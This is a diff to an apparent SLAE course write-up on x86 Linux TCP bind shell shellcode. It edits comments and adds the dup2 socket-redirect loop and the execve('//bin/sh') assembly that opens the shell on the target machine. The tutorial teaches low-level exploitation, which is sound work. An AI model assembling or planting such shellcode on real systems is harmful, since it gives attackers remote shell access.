@@ -530,7 +530,7 @@ Whilst the zero flag is not set (JNZ) - the counter register is decremented each
    	mov al, 0x3f    ; move the dup2 syscall code into the lower part of eax
    	mov ebx, edi    ; move the new int sockfd (stored in edi) into ebx
    	dec cl          ; decrement cl by 1
-   	int 0x80	; call interrupt to execute dup2 syscall
+   	int 0x80	; call the interrupt to execute dup2 syscall
     	jnz loop_dup2   ; jump back to the top of loop_dup2 if the zero flag is not set
 ```
 
@@ -630,13 +630,26 @@ ECX should point to the location of EBX, push EBX onto the stack and then move E
 	mov ecx, esp	; move pointer to '//bin/sh' into ecx, null terminated
 ```
 
-Finally the value of 0x0b is placed into the lower memory region of EAX.
+The execve syscall code can be found in the header file below, converting 11 from decimal to hex equals 0x0b:
 
-The execve syscall and the the exit syscall are executed to initiate the program and finally create the full bind TCP shell on the target machine.
+```bash
+osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
+#define __NR_execve 11
+```
+
+The value of 0x0b is placed into the lower memory region of EAX.
+
+Finally the execve syscall and the the program interrupt are called to execute the program and initiate the full TCP bind shell on the target machine:
+
+```nasm
+	mov al, 0x0b	; execve syscall
+        int 0x80	; call the interrupt to execute execve syscall, execute '//bin/sh' shell
+```
 
 6th syscall (Assembly code section):
 
 ```nasm
+	; 6th syscall - execute /bin/sh using execve 
 	xor eax, eax	; clear register, place execve
 	push eax	; terminator placed onto the stack with value of 0
 	push 0x68732f6e	; push the end of "//bin/sh", 'hs/n'
@@ -647,7 +660,7 @@ The execve syscall and the the exit syscall are executed to initiate the program
 	push ebx	; push 0 onto the stack
 	mov ecx, esp	; move pointer to '//bin/sh' into ecx, null terminated
 	mov al, 0x0b	; execve syscall
-  	int 0x80	; execute '//bin/sh' shell
+  	int 0x80	; call the interrupt to execute execve syscall, execute '//bin/sh' shell
 ```
 
 #### Assembly Code
@@ -713,6 +726,17 @@ _start:
     	jnz loop_dup2   ; jump back to the top of loop_dup2 if the zero flag is not set
 	
 	; 6th syscall - execute /bin/sh using execve 
+	xor eax, eax	; clear register, place execve
+	push eax	; terminator placed onto the stack with value of 0
+	push 0x68732f6e	; push the end of "//bin/sh", 'hs/n'
+	push 0x69622f2f	; push the beginning of "//bin/sh", 'ib//'
+	mov ebx, esp	; move pointer to '//bin/sh' into ebx, null terminated
+	push eax	; push 0 onto the stack
+	mov edx, esp	; move pointer to '//bin/sh' into edx, null terminated
+	push ebx	; push 0 onto the stack
+	mov ecx, esp	; move pointer to '//bin/sh' into ecx, null terminated
+	mov al, 0x0b	; execve syscall
+  	int 0x80	; call the interrupt to execute execve syscall, execute '//bin/sh' shell
 ````
 
 ##### SLAE Disclaimer ####
